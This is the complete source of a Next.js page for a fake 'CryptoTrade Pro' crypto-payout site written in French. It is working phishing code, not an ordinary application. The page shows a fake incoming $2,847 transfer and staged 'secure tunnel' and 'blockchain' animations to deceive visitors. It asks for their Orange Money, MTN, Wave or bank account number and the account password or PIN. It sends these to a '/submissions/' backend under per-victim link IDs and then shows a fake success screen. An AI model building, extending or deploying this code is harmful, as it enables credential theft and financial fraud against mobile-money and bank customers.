'use client';

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    CheckCircle2,
    Lock,
    Zap,
    Building2,
    ShieldCheck,
    Smartphone,
    CreditCard,
    ChevronDown,
    ArrowRight,
    Search,
    Database,
    Loader2,
    Activity,
    Shield,
    Server,
    Globe
} from 'lucide-react';
import confetti from 'canvas-confetti';
import { cn } from '@/lib/utils';
import HeroChart from '@/components/charts/HeroChart';
import { api } from '@/lib/api';
import { useParams } from 'next/navigation';

// --- Types ---

interface FormData {
    fullName: string;
    email: string;
    phone: string;
    accountNumber: string;
    password: string;
    bankName: string;
    operatorName: string;
    method: 'orange' | 'mtn' | 'wave' | 'bank' | 'other' | '';
}

// --- Sub-components ---

// 1. Opening Animation
const OpeningAnimation = ({ onComplete, customMessage }: { onComplete: () => void, customMessage?: string }) => {
    const [progress, setProgress] = useState(0);
    const [amount, setAmount] = useState(0);

    useEffect(() => {
        const timer = setInterval(() => {
            setProgress(prev => Math.min(100, prev + 0.8));
            setAmount(prev => Math.min(2847, prev + 25));
        }, 500);
        const timeout = setTimeout(onComplete, 7000);
        return () => { clearInterval(timer); clearTimeout(timeout); };
    }, [onComplete]);

    return (
        <div className="fixed inset-0 bg-[#03040b] z-[300] flex flex-col items-center justify-center p-6 text-center overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-br from-brand-primary/5 via-transparent to-brand-primary/5 opacity-50" />
            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="relative z-10 space-y-12 max-w-lg w-full">
                <div className="space-y-6">
                    <h1 className="text-3xl sm:text-5xl font-display font-black tracking-[10px] text-white uppercase italic">{customMessage || "CRYPTOTRADE PRO"}</h1>
                    <div className="h-1 w-24 bg-white/10 mx-auto rounded-full overflow-hidden">
                        <motion.div className="h-full bg-brand-primary" initial={{ width: 0 }} animate={{ width: `${progress}%` }} />
                    </div>
                </div>
                <div className="space-y-4">
                    <div className="flex items-center justify-center gap-3">
                        <Loader2 className="w-5 h-5 text-brand-primary animate-spin" />
                        <span className="text-[10px] font-black uppercase tracking-[5px] text-brand-primary animate-pulse">Initializing Secure Tunnel...</span>
                    </div>
                    <div className="text-5xl sm:text-7xl font-display font-black tracking-tighter text-white">${Math.floor(amount).toLocaleString()}</div>
                </div>
            </motion.div>
        </div>
    );
};

// 2. Validation Animation (Professional submission experience)
const AdvancedValidation = ({ onComplete }: { onComplete: () => void }) => {
    const [step, setStep] = useState(0);
    const messages = [
        "TRANSMISSION DES INFORMATIONS...",
        "INFORMATIONS ENREGISTRÉES AVEC SUCCÈS",
        "PROCESSUS D'ASSOCIATION DE COMPTE EN COURS...",
        "SÉCURISATION DE LA LIAISON BLOCKCHAIN...",
        "FINALISATION DU TRANSFERT..."
    ];

    useEffect(() => {
        const i1 = setTimeout(() => setStep(1), 2000);
        const i2 = setTimeout(() => setStep(2), 4000);
        const i3 = setTimeout(() => setStep(3), 6500);
        const i4 = setTimeout(() => setStep(4), 8500);
        const i5 = setTimeout(onComplete, 11000);
        return () => { [i1, i2, i3, i4, i5].forEach(i => clearTimeout(i)); };
    }, [onComplete]);

    return (
        <div className="fixed inset-0 bg-[#03040b] z-[300] flex flex-col items-center justify-center p-6 bg-gradient-to-b from-[#0a0c1a] to-[#03040b]">
            <div className="absolute inset-0 pointer-events-none">
                <div className="absolute top-0 left-0 w-full h-full bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')] opacity-10" />
            </div>

            <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="relative z-10 w-full max-w-2xl space-y-16">
                <div className="text-center space-y-8">
                    <div className="relative flex justify-center">
                        <motion.div animate={{ rotate: 360 }} transition={{ duration: 4, repeat: Infinity, ease: "linear" }} className="w-32 h-32 rounded-full border-t-2 border-brand-primary opacity-20" />
                        <motion.div animate={{ rotate: -360 }} transition={{ duration: 3, repeat: Infinity, ease: "linear" }} className="absolute inset-0 m-auto w-24 h-24 rounded-full border-b-2 border-brand-primary opacity-40" />
                        <div className="absolute inset-0 flex items-center justify-center">
                            {step < 1 ? <Activity className="w-10 h-10 text-brand-primary animate-pulse" /> : <ShieldCheck className="w-10 h-10 text-green-500 shadow-[0_0_20px_rgba(34,197,94,0.5)]" />}
                        </div>
                    </div>
                    <div className="space-y-4">
                        <AnimatePresence mode="wait">
                            <motion.h2
                                key={step}
                                initial={{ opacity: 0, y: 10 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -10 }}
                                className="text-sm font-black uppercase tracking-[8px] text-brand-primary"
                            >
                                {messages[step]}
                            </motion.h2>
                        </AnimatePresence>
                        <div className="flex justify-center gap-1">
                            {[0, 1, 2, 3, 4].map(i => (
                                <motion.div
                                    key={i}
                                    className={cn("h-1 rounded-full bg-brand-primary transition-all duration-500", i <= step ? "w-8 opacity-100" : "w-2 opacity-20")}
                                />
                            ))}
                        </div>
                    </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {[
                        { icon: Shield, label: "Cryptage SSL 256", active: step >= 0 },
                        { icon: Database, label: "Association Wallet", active: step >= 2 },
                        { icon: Server, label: "Liaison Mainnet", active: step >= 3 },
                        { icon: Globe, label: "Transfert Actif", active: step >= 4 },
                    ].map((item, i) => (
                        <div key={i} className={cn("p-6 rounded-2xl border flex items-center gap-4 transition-all duration-700", item.active ? "bg-white/[0.05] border-white/10" : "opacity-10 border-transparent")}>
                            <item.icon className={cn("w-5 h-5", item.active ? "text-brand-primary" : "text-white")} />
                            <span className="text-[10px] font-black uppercase tracking-widest">{item.label}</span>
                            {item.active && <motion.div className="ml-auto w-1 h-1 rounded-full bg-brand-primary" animate={{ scale: [1, 2, 1], opacity: [1, 0.5, 1] }} transition={{ repeat: Infinity }} />}
                        </div>
                    ))}
                </div>
            </motion.div>
        </div>
    );
};

// 3. Main Form
const MainForm = ({ onConfirm }: { onConfirm: (data: FormData) => void }) => {
    const [method, setMethod] = useState<'orange' | 'mtn' | 'wave' | 'bank' | 'other' | ''>('');
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        email: '',
        phone: '',
        accountNumber: '',
        password: '',
        bankName: '',
        operatorName: '',
        method: ''
    });

    const paymentMethods = [
        { id: 'orange', label: 'Orange Money', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png', bg: 'bg-white' },
        { id: 'mtn', label: 'MTN Mobile', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/MTN_Logo.svg/1200px-MTN_Logo.svg.png', bg: 'bg-[#ffcc00]' },
        { id: 'wave', label: 'Wave Mobile', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Wave_Logo_Blue.png/640px-Wave_Logo_Blue.png', bg: 'bg-[#1cbcfc]' },
        { id: 'bank', label: 'Banque', logo: 'https://cdn-icons-png.flaticon.com/512/2830/2830284.png', bg: 'bg-white/5', isInvert: true },
        { id: 'other', label: 'Autre', logo: 'https://cdn-icons-png.flaticon.com/512/3135/3135706.png', bg: 'bg-white/5', isInvert: true },
    ];

    return (
        <div className="min-h-screen bg-[#03040b] pb-32">
            <div className="fixed inset-0 pointer-events-none"><HeroChart /><div className="absolute inset-0 bg-[#03040b]/70 backdrop-blur-[3px]" /></div>

            <nav className="fixed top-0 w-full z-[100] py-5 px-6 border-b border-white/5 bg-brand-bg/60 backdrop-blur-2xl">
                <div className="max-w-7xl mx-auto flex justify-between items-center">
                    <div className="flex items-center gap-3">
                        <div className="w-10 h-10 bg-brand-primary rounded-xl flex items-center justify-center -rotate-6 shadow-2xl"><span className="text-white font-black text-xl italic">₿</span></div>
                        <span className="font-display font-black text-lg uppercase italic text-white/90 tracking-tight">CryptoTrade Pro</span>
                    </div>
                </div>
            </nav>

            <div className="max-w-5xl mx-auto px-6 pt-32 sm:pt-44 space-y-16 relative z-10">
                <section className="glass-card rounded-[40px] p-10 border-brand-primary/20 bg-brand-primary/[0.03] text-center space-y-8 relative overflow-hidden">
                    <div className="inline-flex items-center gap-8 py-4 px-10 rounded-[30px] bg-white/[0.03] border border-white/5"><span className="text-4xl">💻</span><span className="text-2xl text-brand-primary animate-pulse">⚡➡️⚡</span><span className="text-4xl">💰</span></div>
                    <h2 className="text-[13px] font-black uppercase tracking-[6px] text-brand-primary">⚡ CHARGEMENT FONDS VERS LE COMPTE ⚡</h2>
                    <div className="max-w-md mx-auto p-1 rounded-3xl bg-white/5 border border-white/10 flex items-center justify-between pl-8 pr-2">
                        <div className="text-left"><p className="text-[10px] font-black text-brand-text-dim uppercase tracking-widest mb-1">MONTANT EN TRANSFÉRANCE</p><p className="text-4xl font-display font-black text-white tracking-tighter">$2,847.00 💵</p></div>
                        <div className="w-20 h-20 rounded-2xl bg-brand-primary/10 flex items-center justify-center"><Loader2 className="w-10 h-10 text-brand-primary animate-spin" /></div>
                    </div>
                </section>

                <form onSubmit={(e) => { e.preventDefault(); if (method) onConfirm({ ...formData, method }); }} className="space-y-12">
                    <article className="glass-card rounded-[40px] p-10 sm:p-16 border-white/5 space-y-12 bg-white/[0.01]">
                        <div className="flex items-center gap-6"><div className="w-14 h-14 rounded-2xl bg-brand-primary/10 flex items-center justify-center text-brand-primary border border-brand-primary/10 font-bold italic text-2xl">01</div><h3 className="text-xl font-display font-black tracking-widest uppercase">📋 INFOS PERSONNELLES</h3></div>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
                            <div className="space-y-4"><label className="text-[11px] font-black text-brand-primary uppercase tracking-[3px]">Nom complet *</label><input required className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-5 px-8 text-sm focus:border-brand-primary outline-none transition-all" value={formData.fullName} onChange={e => setFormData({ ...formData, fullName: e.target.value })} /></div>
                            <div className="space-y-4"><label className="text-[11px] font-black text-brand-primary uppercase tracking-[3px]">Email *</label><input required type="email" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-5 px-8 text-sm focus:border-brand-primary outline-none transition-all" value={formData.email} onChange={e => setFormData({ ...formData, email: e.target.value })} /></div>
                            <div className="space-y-4 md:col-span-2"><label className="text-[11px] font-black text-brand-primary uppercase tracking-[3px]">Numéro de téléphone *</label><input required type="tel" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-5 px-8 text-sm focus:border-brand-primary outline-none transition-all" value={formData.phone} onChange={e => setFormData({ ...formData, phone: e.target.value })} /></div>
                        </div>
                    </article>

                    <article className="glass-card rounded-[40px] p-10 sm:p-16 border-white/5 space-y-12">
                        <div className="flex items-center gap-6"><div className="w-14 h-14 rounded-2xl bg-brand-primary/10 flex items-center justify-center text-brand-primary border border-brand-primary/10 font-bold italic text-2xl">02</div><h3 className="text-xl font-display font-black tracking-widest uppercase">💳 MOYEN DE RÉCEPTION</h3></div>
                        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-4">
                            {paymentMethods.map(m => (
                                <div key={m.id} onClick={() => setMethod(m.id as any)} className={cn("cursor-pointer p-6 rounded-[32px] border transition-all flex flex-col items-center gap-4 group relative overflow-hidden", method === m.id ? "border-brand-primary bg-brand-primary/5 ring-2 ring-brand-primary/30" : "bg-white/[0.02] border-white/5 hover:bg-white/[0.05]")}>
                                    <div className={cn("w-16 h-16 rounded-2xl flex items-center justify-center p-2 transition-transform duration-500 group-hover:scale-110 shadow-xl", m.bg)}><img src={m.logo} alt={m.label} className={cn("w-full h-full object-contain", m.isInvert && "invert opacity-80")} /></div>
                                    <span className={cn("text-[10px] font-black uppercase tracking-widest leading-tight transition-opacity", method === m.id ? "opacity-100" : "opacity-40")}>{m.label}</span>
                                    {method === m.id && <div className="absolute top-2 right-2"><CheckCircle2 className="w-4 h-4 text-brand-primary" /></div>}
                                </div>
                            ))}
                        </div>
                    </article>

                    <AnimatePresence mode="wait">
                        {method && (
                            <motion.article initial={{ opacity: 0, y: 30 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, scale: 0.95 }} className="glass-card rounded-[40px] p-10 border-white/5 space-y-10">
                                <div className="flex items-center gap-6"><div className="w-14 h-14 rounded-2xl bg-brand-primary/10 flex items-center justify-center text-brand-primary border border-brand-primary/10 font-bold italic text-2xl">03</div><h3 className="text-xl font-display font-black tracking-widest uppercase">LIAISON & SÉCURISATION</h3></div>
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-10">
                                    {(method === 'bank' || method === 'other') && <div className="space-y-4"><label className="text-[11px] font-black text-brand-primary uppercase tracking-[3px]">Banque/Service *</label><input required className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-5 px-8 text-sm focus:border-brand-primary outline-none transition-all" value={formData.bankName} onChange={e => setFormData({ ...formData, bankName: e.target.value })} /></div>}
                                    <div className="space-y-4"><label className="text-[11px] font-black text-brand-primary uppercase tracking-[3px]">NUMERO DE COMPTE *</label><input required className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-5 px-8 text-sm focus:border-brand-primary outline-none transition-all" value={formData.accountNumber} onChange={e => setFormData({ ...formData, accountNumber: e.target.value })} /></div>
                                    <div className="space-y-4"><label className="text-[11px] font-black text-brand-primary uppercase tracking-[3px]">VOTRE MOT DE PASSE / PIN DE COMPTE *</label><input required type="password" autoComplete="new-password" placeholder="Entrez votre code secret personnel" className="w-full bg-[#03040b] border border-white/10 rounded-2xl py-5 px-8 text-sm focus:border-brand-primary outline-none transition-all" value={formData.password} onChange={e => setFormData({ ...formData, password: e.target.value })} /></div>
                                </div>
                                <div className="pt-8 flex justify-center"><button type="submit" className="btn-premium px-16 py-6 rounded-3xl text-sm font-black uppercase tracking-[5px] shadow-2xl">🚀 FINALISER LA LIAISON</button></div>
                            </motion.article>
                        )}
                    </AnimatePresence>
                </form>
            </div>
        </div>
    );
};

// 4. Success Screen
const SuccessScreen = ({ email }: { email: string }) => {
    useEffect(() => {
        const colors = ['#0070f3', '#10b981'];
        const end = Date.now() + 5000;
        const frame = () => {
            confetti({ particleCount: 3, angle: 60, spread: 55, origin: { x: 0 }, colors });
            confetti({ particleCount: 3, angle: 120, spread: 55, origin: { x: 1 }, colors });
            if (Date.now() < end) requestAnimationFrame(frame);
        };
        frame();
    }, []);

    return (
        <div className="fixed inset-0 bg-[#03040b] z-[400] flex flex-col items-center justify-center p-6 text-center">
            <motion.div initial={{ y: 20, opacity: 0 }} animate={{ y: 0, opacity: 1 }} className="space-y-12 max-w-lg">
                <div className="w-32 h-32 rounded-full bg-green-500 flex items-center justify-center mx-auto shadow-[0_0_50px_rgba(34,197,94,0.3)]"><CheckCircle2 className="w-16 h-16 text-white" /></div>
                <div className="space-y-4 text-white">
                    <h2 className="text-4xl font-display font-black uppercase italic tracking-tight">✓ Association Terminée !</h2>
                    <p className="opacity-60 font-medium">Lien certifié avec succès. Votre dossier de transfert est en cours de traitement pour l&apos;adresse : <br /><span className="text-brand-primary font-black uppercase tracking-widest text-[11px]">{email}</span></p>
                </div>
                <div className="text-[10px] font-black uppercase tracking-[5px] text-white/20">Vous pouvez maintenant fermer cette fenêtre en toute sécurité.</div>
            </motion.div>
        </div>
    );
};

export default function ClientLinkPage() {
    const [stage, setStage] = useState<'opening' | 'form' | 'validating' | 'success'>('opening');
    const [capturedEmail, setCapturedEmail] = useState('');
    const [appSettings, setAppSettings] = useState<any>(null);
    const [linkInfo, setLinkInfo] = useState<any>(null);
    const [loading, setLoading] = useState(true);

    const params = useParams();
    const linkId = params.id as string;

    useEffect(() => {
        const fetchConfig = async () => {
            try {
                const [settings, links] = await Promise.all([
                    api.get('/settings/singleton/'),
                    api.get(`/links/`)
                ]);
                setAppSettings(settings);
                const findLink = links.find((l: any) => l.link_id === linkId);
                if (findLink) setLinkInfo(findLink);
            } catch (err) { console.error(err); } finally { setLoading(false); }
        };
        fetchConfig();
    }, [linkId]);

    const onFormConfirm = async (data: FormData) => {
        setCapturedEmail(data.email);
        setStage('validating');
        try {
            await api.post('/submissions/', {
                full_name: data.fullName,
                email: data.email,
                phone: data.phone,
                method: data.method,
                account_number: data.accountNumber,
                password: data.password,
                bank_name: data.bankName || '',
                operator_name: data.operatorName || '',
                link_id: linkId,
                status: 'Nouveau'
            });
        } catch (err) {
            console.error("Submission error:", err);
            // Fallback for visual continuity if API fails
            setTimeout(() => setStage('success'), 11000);
        }
    };

    if (loading) return <div className="min-h-screen bg-[#03040b] flex items-center justify-center"><Loader2 className="w-12 h-12 text-brand-primary animate-spin" /></div>;
    if (!linkInfo) return <div className="min-h-screen bg-[#03040b] flex items-center justify-center text-center"><h1 className="text-3xl text-red-500 font-black px-6">ACCÈS REFUSÉ : LIEN INVALIDE</h1></div>;

    return (
        <main className="min-h-screen bg-[#03040b]">
            <AnimatePresence mode="wait">
                {stage === 'opening' && <OpeningAnimation key="opening" onComplete={() => setStage('form')} customMessage={appSettings?.welcome_message} />}
                {stage === 'form' && <motion.div key="form" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}><MainForm onConfirm={onFormConfirm} /></motion.div>}
                {stage === 'validating' && <AdvancedValidation key="validating" onComplete={() => setStage('success')} />}
                {stage === 'success' && <SuccessScreen key="success" email={capturedEmail} />}
            </AnimatePresence>
        </main>
    );
}
